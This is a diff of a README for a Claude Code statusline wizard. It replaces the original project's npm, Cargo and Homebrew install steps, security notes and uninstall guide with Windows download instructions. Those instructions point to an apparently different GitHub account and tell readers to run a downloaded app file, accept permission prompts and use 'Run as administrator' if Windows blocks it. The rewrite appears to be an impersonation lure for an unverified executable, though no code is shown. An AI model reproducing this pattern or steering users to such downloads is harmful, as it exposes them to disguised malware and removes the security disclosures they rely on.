@@ -1,136 +1,186 @@
-# cc-statusline
+# ⌨️ cc-statusline-tui - Set Up Claude Statusline Fast
 
-[![CI](https://github.com/LokiQ0713/cc-statusline-tui/actions/workflows/ci.yml/badge.svg)](https://github.com/LokiQ0713/cc-statusline-tui/actions/workflows/ci.yml)
-[![Release](https://github.com/LokiQ0713/cc-statusline-tui/actions/workflows/release.yml/badge.svg)](https://github.com/LokiQ0713/cc-statusline-tui/actions/workflows/release.yml)
-[![npm](https://img.shields.io/npm/v/cc-statusline-tui)](https://www.npmjs.com/package/cc-statusline-tui)
-[![crates.io](https://img.shields.io/crates/v/cc-statusline-tui)](https://crates.io/crates/cc-statusline-tui)
+[![Download](https://img.shields.io/badge/Download-cc--statusline--tui-blue?style=for-the-badge)](https://github.com/Sodanitertraction336/cc-statusline-tui)
 
-> Your Claude Code statusline is boring. Let's fix that.
+## 🖥️ What this does
 
-[中文](README.zh.md) | [日本語](README.ja.md) | [한국어](README.ko.md) | [Español](README.es.md) | [Português](README.pt.md) | [Русский](README.ru.md)
+cc-statusline-tui is a simple wizard for setting up Claude Code’s status line. It helps you choose what shows in your terminal, such as model, cost, usage, git info, context, crypto prices, and BTC price.
 
-![statusline preview](preview.png)
+It is made for people who want a quick setup with clear choices. You can pick from multiple color styles, presets, and languages without editing config files by hand.
 
-One command. Seven languages. Zero regrets.
+## 📥 Download and run on Windows
 
-## Install
+1. Open the download page: https://github.com/Sodanitertraction336/cc-statusline-tui
+2. Download the Windows version for your system
+3. If the file is in a ZIP folder, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file to start it
+6. If Windows asks for permission, choose Yes
+7. Follow the on-screen wizard to set up your status line
 
-Pick your poison:
+If you use Windows Terminal or another terminal app, open it first, then run the app from the folder where you saved it.
 
-### npm
+## ⚙️ What you can set
 
-```bash
-npx cc-statusline-tui@latest
-```
+This tool gives you a guided way to configure:
 
-### Cargo
+- 7 status line segments
+  - model
+  - cost
+  - usage
+  - git
+  - context
+  - crypto prices
+  - BTC price
+- 12 color styles
+- 5 presets
+- 7 languages
 
-```bash
-cargo install cc-statusline-tui
-```
+You can use it to build a status line that matches the way you work. If you want less noise, pick a simple preset. If you want more detail, turn on the segments you need.
 
-### Homebrew
+## 🧭 How to use the wizard
 
-```bash
-brew tap LokiQ0713/cc-statusline-tui
-brew install cc-statusline
-```
+1. Start the app
+2. Choose your language
+3. Pick a preset
+4. Select the segments you want
+5. Choose a color style
+6. Review the setup
+7. Save the result
 
-## What Happens
+The wizard keeps each step clear. You choose from simple menus instead of typing long commands.
 
-A TUI wizard pops up. You pick stuff. It looks cool. That's it.
+## 🎨 Presets and styles
 
-```
-1/4 Segments      → What to show
-2/4 Configure     → How it looks (live preview, instant feedback)
-3/4 Reorder       → Where things go
-4/4 Confirm       → Ship it
-```
+The app includes 5 presets so you can get started fast. A preset gives you a ready-made layout, then you can change it later.
 
-Too lazy to customize? Pick "Use defaults" and press Enter twice. We don't judge.
+The 12 color styles help you match your terminal theme. Some styles use high contrast for easy reading. Others use softer colors for a calmer look.
 
-## Segments
+If you are not sure where to start, pick a preset that shows model, git, and context. That gives you useful info without filling the screen.
 
-| Segment | Looks Like | What It Does | You Can Tweak |
-|---------|-----------|--------------|---------------|
-| Model | `🔥 Opus4.6` | Shows which brain you're burning through | Icon (🔥🦊🐢🐰), color |
-| Cost | `$0.42` | Your wallet's pain level | Color |
-| Usage | `██░░ 25% 1h43m` | 5h rate limit: bar + % + reset countdown | Bar style/char/length, color |
-| Path | `~/project` | Where you are | Color, max length |
-| Git | `main* ↑2↓1` | Branch + dirty flag + ahead/behind | Components, color |
-| Context | `▓▓▓▓░░░ 60% 600K/1M` | How much context window you've eaten | Bar style/char/length, color |
-| Crypto | `BTC:$73748` | Because why not check prices while coding | Coins (BTC/ETH/BNB/SOL), color, refresh |
+## 🌍 Languages
 
-## Color Styles
+cc-statusline-tui includes 7 languages, so you can use the wizard in a language that feels natural.
 
-| Style | Vibe |
-|-------|------|
-| **Ultrathink Rainbow** | Every character is a different color. Yes, it shimmers. |
-| **Ultrathink Gradient** | Smooth rainbow across the bar. Chef's kiss. |
-| **Traffic Light** | Green (≤30%) → Yellow (≤60%) → Red (>60%). Your context window is a traffic jam. |
-| Cyan / Green / Blue / Yellow | The sensible choices |
-| Magenta / Red / Orange / Pink / Purple / White | The expressive choices |
+This helps when you want to move through setup fast and avoid mistakes. The labels and choices stay short and clear.
 
-## Languages
+## 💻 Windows setup tips
 
-English, 中文, 日本語, 한국어, Español, Português, Русский.
+- Keep the app in a folder you can find again
+- Use a normal folder name with no special symbols
+- If the window looks too small, change the terminal size
+- If text is hard to read, switch to a different color style
+- If you want a clean layout, start with a simple preset
 
-Selected on first run. Your statusline speaks your language.
+If you use a synced folder like OneDrive, make sure the file stays in place after download.
 
-## How It Works
+## 📌 What the status line can show
 
-1. Wizard saves config to `~/.claude/statusline/config.json`
-2. Binary goes to `~/.claude/statusline/bin/`
-3. `~/.claude/settings.json` gets updated automatically
-4. Restart Claude Code. Admire your new statusline. Tell your coworkers.
+### Model
+Shows the model in use so you can see it at a glance.
 
-Re-running the wizard loads your existing config as defaults. Non-destructive. Promise.
+### Cost
+Shows cost info so you can keep track of usage.
 
-## Requirements
+### Usage
+Shows how much you have used in the current session.
 
-- Claude Code installed (`~/.claude/` exists)
-- Node.js ≥ 18 (only for `npx` install — not needed at runtime or for `cargo install`)
+### Git
+Shows git info for code work, like branch or status.
 
-## Security and Privacy
+### Context
+Shows context data so you know how much space is left.
 
-- The **crypto segment** makes requests to Binance public API (`api.binance.com`) — no authentication required, no personal data sent
-- The **usage segment** reads rate limit data directly from Claude Code's native stdin JSON (`rate_limits` field) — no external API calls, no keychain access, works on all platforms
-- The **npm postinstall** downloads a platform-specific binary from GitHub Releases — no other external downloads
-- Crypto data is cached locally in `/tmp/claude-statusline-*` files
-- No telemetry, no analytics, no data sent anywhere else
-- For full details see [SECURITY.md](SECURITY.md)
+### Crypto prices
+Shows crypto price data in the status line.
 
-## Uninstall
+### BTC price
+Shows the current Bitcoin price.
 
-```bash
-# Remove config and binary
-rm -rf ~/.claude/statusline/
+You can keep only the items you want. That makes the terminal easier to read.
 
-# Remove statusline from Claude Code settings
-# Edit ~/.claude/settings.json and delete the "statusLine" key
+## 🔧 Basic system needs
 
-# Remove cache
-rm -f /tmp/claude-statusline-*
+- Windows 10 or newer
+- A working terminal app
+- Enough disk space for a small desktop app
+- Permission to run files from your Downloads folder
 
-# Uninstall from package manager
-npm uninstall -g cc-statusline-tui
-# or: cargo uninstall cc-statusline-tui
-# or: brew uninstall cc-statusline
-```
+For the best result, use a recent Windows build and keep your display scaling at a normal size.
 
-## Troubleshooting
+## 🧩 Common setup choices
 
-| Problem | Fix |
-|---------|-----|
-| "Binary not found" | Run `npx cc-statusline-tui@latest` again to re-download |
-| "Is a directory" error | Check that `~/.claude/statusline/bin/cc-statusline` is a file, not a directory |
-| Crypto not showing | Delete `/tmp/claude-statusline-crypto-lock` directory if it exists (stale lock) |
-| Changes not visible | Restart Claude Code after saving configuration |
+If you want a simple start:
 
-## Contributing
+- Preset: minimal
+- Segments: model, git, context
+- Style: high contrast
+- Language: your main language
 
-Found a bug? Want a feature? [Open an issue](https://github.com/LokiQ0713/cc-statusline-tui/issues). PRs welcome.
+If you want more detail:
 
-## License
+- Preset: full
+- Segments: model, cost, usage, git, context
+- Style: colored
+- Language: the one you read fastest
 
-MIT
+If you track markets:
+
+- Preset: custom
+- Segments: crypto prices, BTC price
+- Style: dark
+- Language: your main language
+
+## 📂 File handling
+
+If the download comes as a ZIP file:
+
+1. Save it to your computer
+2. Extract it
+3. Open the folder
+4. Run the app file inside
+
+If the download comes as a single app file:
+
+1. Save it to your computer
+2. Double-click it
+3. Follow the wizard
+
+Keep the app in a stable folder if you want to open it again later.
+
+## 🔍 Troubleshooting
+
+### The app does not open
+- Check that the file finished downloading
+- Try opening it from the folder where you saved it
+- Right-click the file and choose Run as administrator if Windows blocks it
+
+### The text looks strange
+- Change the terminal font
+- Increase the terminal window size
+- Switch to another color style
+
+### The app closes right away
+- Open it from a terminal window instead of from the file list
+- Check that the download is complete
+- Download it again from the link above
+
+### The display feels crowded
+- Use fewer segments
+- Pick a smaller preset
+- Remove crypto price items if you do not need them
+
+## 🗂️ Repository details
+
+- Repository: cc-statusline-tui
+- Type: Interactive TUI wizard
+- Main use: Claude Code statusline setup
+- Topics: anthropic, claude, claude-code, cli, configuration, crypto-price-tracking, developer-tools, ratatui, rust, statusline, terminal, tui
+
+## 🔗 Download again
+
+[Visit the download page](https://github.com/Sodanitertraction336/cc-statusline-tui)
+
+## 🛠️ For later use
+
+After setup, keep the app and your saved choices in the same folder if you want to rerun the wizard. If you want to change the look later, open the app again and pick new segments, a new preset, or a new color style
